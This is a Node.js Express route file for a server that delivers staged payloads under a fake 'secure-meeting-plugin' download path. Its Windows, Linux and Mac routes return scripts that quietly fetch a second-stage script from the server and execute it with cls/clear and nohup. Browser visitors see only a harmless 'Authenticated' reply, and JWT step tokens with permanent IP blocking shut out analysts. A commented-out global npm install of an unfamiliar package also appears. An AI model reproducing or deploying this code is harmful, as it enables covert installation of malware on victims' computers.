// routes/task.js
// Full rewrite: tokenized multi-step flow using signed JWTs (no server-side step state).
// Steps:
//  1) /windows|/linux|/mac  -> server issues step1 token (st1) and returns platform script that calls /token?token=<orig>&st=<st1>
//  2) /token|/tokenlinux    -> server verifies st1, enforces delay, issues step2 token (st2), serves token.npl/tokenlinux.npl with {{STEP_TOKEN}} replaced by st2
//  3) /tokenParser|/package.json -> server verifies st2 and serves files (requires client to send st (step token) as query param or Authorization header)
//
// Config:
//  - SECURITY_ENABLED=true enables Firebase persistent blocklist (needs FIREBASE_SERVICE_ACCOUNT env or ../serviceAccountKey.json).
//  - SECRET_KEY used to sign JWTs (set in env). If not set, a default insecure key is used (change it).
//  - STEP_MIN_DELAY_MS controls minimum wait time between step1 and step2.

const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

// -------------------------
// CONFIG
// -------------------------
const SECURITY_ENABLED = true;
const STEP_MIN_DELAY_MS = parseInt(process.env.STEP_MIN_DELAY_MS || '4000', 10); // minimum wait between step1 and step2
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '3m'; // short-lived tokens
const SECRET_KEY = process.env.SECRET_KEY || 'CHANGE_THIS_SECRET_TO_A_STRONG_VALUE';

// Firebase setup (optional)
let firebaseAdmin = null;
let blockedRef = null;
let securityActive = false;
let serviceAccount = null;

if (SECURITY_ENABLED) {
  try {
    console.log('[SECURITY] Initializing Firebase Admin SDK...');
    const admin = require('firebase-admin');

    if (process.env.FIREBASE_SERVICE_ACCOUNT) {
      console.log('[SECURITY] Using FIREBASE_SERVICE_ACCOUNT from environment.');
      serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    } else {
      console.log('[SECURITY] Using local serviceAccountKey.json');
      serviceAccount = require('../serviceAccountKey.json');
    }

    if (!admin.apps.length) {
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
      });
    }

    firebaseAdmin = admin;
    const db = admin.firestore();
    blockedRef = db.collection('blocked_ips');
    securityActive = true;
    console.log('[SECURITY] Firebase Admin initialized; blocklist collection ready.');
  } catch (err) {
    console.error('[SECURITY] Firebase Admin initialization failed — security disabled:', err);
    firebaseAdmin = null;
    blockedRef = null;
    securityActive = false;
  }
} else {
  console.log('[SECURITY] SECURITY_ENABLED=false; running without persistent Firebase blocklist.');
}

// -------------------------
// Helpers
// -------------------------
function normalizeIp(raw) {
  if (!raw) return '';
  return String(raw).split(',')[0].trim();
}
function getIpFromReq(req) {
  return normalizeIp(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '');
}
function genSessionId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return crypto.createHash('sha256').update(String(Date.now()) + Math.random()).digest('hex');
}

async function isIpBlocked(ip) {
  // if (!SECURITY_ENABLED || !securityActive || !blockedRef || !ip) return false;
  // try {
  //   const doc = await blockedRef.doc(ip).get();
  //   if (doc && doc.exists) return true;
  // } catch (err) {
  //   console.error('[SECURITY] Blocklist check error (allowing request):', err);
  //   return false;
  // }
  return false;
}

async function persistentlyBlockIp(ip, reason) {
  if (!SECURITY_ENABLED || !securityActive || !blockedRef || !ip) return;
  try {
    await blockedRef.doc(ip).set({
      ip,
      reason: reason || 'manual execution',
      timestamp: Date.now(),
    });
    console.log('[SECURITY] Persistently blocked IP saved to Firebase:', ip);
  } catch (err) {
    console.error('[SECURITY] Failed to persistently block IP in Firebase:', err);
  }
}

async function blockAndRespond(ip, res, reason) {
  console.warn('[SECURITY] Blocking IP', ip, '-', reason);
  await persistentlyBlockIp(ip, reason);
  return res.status(403).send('Access permanently suspended.');
}

// JWT helpers
function createStepToken(ip, sessionId, step, origToken) {
  const payload = {
    ip,
    sessionId,
    step,
    timestamp: Date.now(),
    origToken: origToken || null
  };
  return jwt.sign(payload, SECRET_KEY, { expiresIn: JWT_EXPIRES_IN });
}

function verifyStepToken(token) {
  if (!token) return null;
  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    return decoded;
  } catch (err) {
    return null;
  }
}

function getBearerFromReq(req) {
  const header = req.get('Authorization') || req.get('authorization') || '';
  if (!header) return null;
  const parts = header.split(' ');
  if (parts.length === 2 && /^Bearer$/i.test(parts[0])) return parts[1];
  return null;
}

function isBrowserUserAgent(userAgent) {
  return /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent);
}

// -------------------------
// SSE map - preserved (optional) for notifying client about events (best-effort)
// -------------------------
const sseClients = new Map(); // token -> res

router.get('/events', (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(400).send('Missing token');
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.flushHeaders();
  res.write(`data: connected\n\n`);
  sseClients.set(token, res);
  req.on('close', () => {
    sseClients.delete(token);
  });
});

// -------------------------
// STEP 1: /windows, /linux, /mac
// - Always create a new sessionId and st1 token
// - Return platform script. Scripts call /token or /tokenlinux with both orig token and st=st1
// -------------------------
router.get('/windows', async (req, res) => {
  try {
    const origToken = "903";
    const userAgent = req.get('User-Agent') || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED - first step (windows):', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const sessionId = genSessionId();
    const st1 = createStepToken(ip, sessionId, 1, origToken);

    if (isBrowserUserAgent(userAgent)) {
      // Browser visit - keep same behavior as before (simple response)
      return res.type('text/plain').send('@echo off\necho Authenticated');
    } else {
      const domain = req.protocol + '://' + req.get('host');
      // Note: we include both original token and step token st in query string.
      // Client script must pass both when requesting /token
      return res.type('text/plain').send(`@echo off
if exist "%USERPROFILE%\\parse" del "%USERPROFILE%\\parse"
if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
curl -s -L -o "%USERPROFILE%//parse" "${domain}/secure-meeting-plugin/download/latest/token?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
ren "%USERPROFILE%\\parse" token.cmd
"%USERPROFILE%\\token.cmd"
cls
`);
    }
  } catch (err) {
    console.error('[ROUTE] /windows error:', err);
    return res.status(500).send('Internal error');
  }
});

router.get('/linux', async (req, res) => {
  try {
    const origToken = "903";
    const userAgent = req.get('User-Agent') || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED - first step (linux):', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const sessionId = genSessionId();
    const st1 = createStepToken(ip, sessionId, 1, origToken);

    if (isBrowserUserAgent(userAgent)) {
      return res.type('text/plain').send('@echo off\necho Authenticated');
    } else {
      const domain = req.protocol + '://' + req.get('host');
      return res.type('text/plain').send(`#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "${domain}/secure-meeting-plugin/download/latest/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`);
    }
  } catch (err) {
    console.error('[ROUTE] /linux error:', err);
    return res.status(500).send('Internal error');
  }
});

router.get('/mac', async (req, res) => {
  try {
    const origToken = "903";
    const userAgent = req.get('User-Agent') || '';
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED - first step (mac):', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const sessionId = genSessionId();
    const st1 = createStepToken(ip, sessionId, 1, origToken);

    if (isBrowserUserAgent(userAgent)) {
      return res.type('text/plain').send('@echo off\necho Authenticated');
    } else {
      const domain = req.protocol + '://' + req.get('host');
      return res.type('text/plain').send(`#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/secure-meeting-plugin/download/latest/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
`);
    }
  } catch (err) {
    console.error('[ROUTE] /mac error:', err);
    return res.status(500).send('Internal error');
  }
});

// -------------------------
// STEP 2: /token and /tokenlinux
// - Must include query param st (step1 token) OR Authorization Bearer <st>
// - Verify st: step===1, ip matches, origToken matches provided token (optional), timestamp old enough
// - If ok: create step2 token (st2) with step=2 and inject it into the returned token.npl content using {{STEP_TOKEN}}
// - If verification fails -> persistent block in Firebase
// -------------------------
router.get('/token', async (req, res) => {
  try {
    const origToken = req.query.token;
    const st = req.query.st || getBearerFromReq(req);
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);
    const filePath = path.join(__dirname, '..', 'public', 'token.npl');

    console.log('[ROUTE] /token called by', ip, 'origToken=', origToken ? origToken : '(none)');
    console.log(st);

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED (token) -', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const decoded = verifyStepToken(st);
    if (!decoded) {
      return await blockAndRespond(ip, res, 'Invalid or missing step1 token (st)');
    }

    // validate step & ip
    if (decoded.step !== 1) {
      return await blockAndRespond(ip, res, 'Wrong step in provided token for /token (expected step 1)');
    }
    if (decoded.ip !== ip) {
      return await blockAndRespond(ip, res, 'IP mismatch between JWT and request IP (possible forgery)');
    }
    // optional: ensure the origToken in JWT matches the origToken query param (if provided)
    if (decoded.origToken && origToken && String(decoded.origToken) !== String(origToken)) {
      return await blockAndRespond(ip, res, 'Original token mismatch between steps');
    }

    // enforce minimum delay since token timestamp
    const elapsed = Date.now() - (decoded.timestamp || 0);
    console.log('[FLOW] elapsed since step1 token timestamp (ms):', elapsed);
    if (elapsed > STEP_MIN_DELAY_MS) {
      return await blockAndRespond(ip, res, `Step2 requested too soon (<${STEP_MIN_DELAY_MS}ms)`);
    }

    // OK -> create step2 token
    const st2 = createStepToken(ip, decoded.sessionId, 2, origToken);

    // read token.npl and replace placeholders
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] token.npl read error:', err);
        return res.status(500).send('Error reading token.npl');
      }

      const domain = `${req.protocol}://${req.get('host')}`;
      let modified = content.replace(/{{DOMAIN}}/g, domain).replace(/{{token}}/g, origToken || '');

      // inject step token into placeholder {{STEP_TOKEN}} if present; otherwise append comment lines containing the token
      if (modified.includes('{{STEP_TOKEN}}')) {
        modified = modified.replace(/{{STEP_TOKEN}}/g, st2);
      } else {
        // append both windows batch and sh comments so one of them is usable depending on the script type
        modified += `\n:: STEP_TOKEN=${st2}\n# STEP_TOKEN=${st2}\n`;
      }

      // preserve original conditional call behavior if needed (token == "812")
      
      // modified = modified.replace(/{{call}}/g, '');
      // if (origToken === '812') {
      //   const call = 'call npm install -g react-icon-updater';
      //   modified = modified.replace(/{{call}}/g, call);
      // } else {
      //   modified = modified.replace(/{{call}}/g, '');
      // }

      // notify SSE (best-effort)
      try {
        if (origToken && sseClients.has(origToken)) {
          sseClients.get(origToken).write(`data: token_served\n\n`);
        }
      } catch (e) {
        console.error('[SSE] Failed to notify client about token_served:', e);
      }

      res.type('text/plain').send(modified);
    });
  } catch (err) {
    console.error('[ROUTE] /token error:', err);
    return res.status(500).send('Internal error');
  }
});

router.get('/tokenlinux', async (req, res) => {
  try {
    const origToken = req.query.token;
    const st = req.query.st || getBearerFromReq(req);
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);
    const filePath = path.join(__dirname, '..', 'public', 'tokenlinux.npl');

    console.log('[ROUTE] /tokenlinux called by', ip, 'origToken=', origToken ? origToken : '(none)');

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED (tokenlinux) -', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const decoded = verifyStepToken(st);
    if (!decoded) {
      return await blockAndRespond(ip, res, 'Invalid or missing step1 token (st)');
    }

    if (decoded.step !== 1) {
      return await blockAndRespond(ip, res, 'Wrong step in provided token for /tokenlinux (expected step 1)');
    }
    if (decoded.ip !== ip) {
      return await blockAndRespond(ip, res, 'IP mismatch between JWT and request IP (possible forgery)');
    }
    if (decoded.origToken && origToken && String(decoded.origToken) !== String(origToken)) {
      return await blockAndRespond(ip, res, 'Original token mismatch between steps');
    }

    const elapsed = Date.now() - (decoded.timestamp || 0);
    console.log('[FLOW] elapsed since step1 token timestamp (ms):', elapsed);
    if (elapsed > STEP_MIN_DELAY_MS) {
      return await blockAndRespond(ip, res, `Step2 requested too soon (<${STEP_MIN_DELAY_MS}ms)`);
    }

    // OK -> create step2 token
    const st2 = createStepToken(ip, decoded.sessionId, 2, origToken);

    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] tokenlinux.npl read error:', err);
        return res.status(500).send('Error reading tokenlinux.npl');
      }

      const domain = `${req.protocol}://${req.get('host')}`;
      let modified = content.replace(/{{DOMAIN}}/g, domain).replace(/{{token}}/g, origToken || '');

      if (modified.includes('{{STEP_TOKEN}}')) {
        modified = modified.replace(/{{STEP_TOKEN}}/g, st2);
      } else {
        modified += `\n# STEP_TOKEN=${st2}\n:: STEP_TOKEN=${st2}\n`;
      }

      try {
        if (origToken && sseClients.has(origToken)) {
          sseClients.get(origToken).write(`data: tokenlinux_served\n\n`);
        }
      } catch (e) {
        console.error('[SSE] Failed to notify client about tokenlinux_served:', e);
      }

      res.type('text/plain').send(modified);
    });
  } catch (err) {
    console.error('[ROUTE] /tokenlinux error:', err);
    return res.status(500).send('Internal error');
  }
});

// -------------------------
// STEP 3: /tokenParser and /package.json
// - Must present st (step2 token) as query param or Authorization header
// - Verify st: step===2, ip matches
// - Serve resource if ok
// -------------------------
router.get('/tokenParser', async (req, res) => {
  try {
    const origToken = req.query.token;
    const st = req.query.st || getBearerFromReq(req);
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);

    console.log('[ROUTE] /tokenParser called by', ip, 'origToken=', origToken ? origToken : '(none)');

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED (tokenParser) -', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const decoded = verifyStepToken(st);
    if (!decoded) {
      return await blockAndRespond(ip, res, 'Invalid or missing step2 token (st)');
    }

    if (decoded.step !== 2) {
      return await blockAndRespond(ip, res, 'Wrong step in provided token for /tokenParser (expected step 2)');
    }
    if (decoded.ip !== ip) {
      return await blockAndRespond(ip, res, 'IP mismatch between JWT and request IP (possible forgery)');
    }

    // serve the requested file (same behavior as original: read ../public/<token>)
    const filePath = path.join(__dirname, '..', 'public', origToken || '');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] tokenParser read error:', err);
        return res.status(500).send(filePath);
      }
      // optionally notify SSE
      try {
        if (origToken && sseClients.has(origToken)) sseClients.get(origToken).write(`data: tokenParser_served\n\n`);
      } catch (e) {}
      return res.type('text/plain').send(content);
    });
  } catch (err) {
    console.error('[ROUTE] /tokenParser error:', err);
    return res.status(500).send('Internal error');
  }
});

router.get('/package.json', async (req, res) => {
  try {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const ip = normalizeIp(rawIp);

    console.log('[ROUTE] /package.json called by', ip);

    if (await isIpBlocked(ip)) {
      console.log('[SECURITY] BLOCKED (package.json) -', ip);
      return res.status(403).send('Access permanently suspended.');
    }

    const filePath = path.join(__dirname, '..', 'public', 'package.json');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] package.json read error:', err);
        return res.status(500).send(filePath);
      }
      return res.type('text/plain').send(content);
    });
  } catch (err) {
    console.error('[ROUTE] /package.json error:', err);
    return res.status(500).send('Internal error');
  }
});

// -------------------------
// Debug endpoint to show token info (useful during dev only)
// -------------------------
router.get('/_debug/decode', (req, res) => {
  if (process.env.NODE_ENV === 'production') return res.status(403).send('Forbidden');
  const st = req.query.st || getBearerFromReq(req);
  if (!st) return res.status(400).send('Missing st');
  try {
    const decoded = jwt.decode(st);
    return res.json({ decoded });
  } catch (err) {
    return res.status(400).send('Invalid token');
  }
});

// -------------------------
// Exports
// -------------------------

module.exports = router;
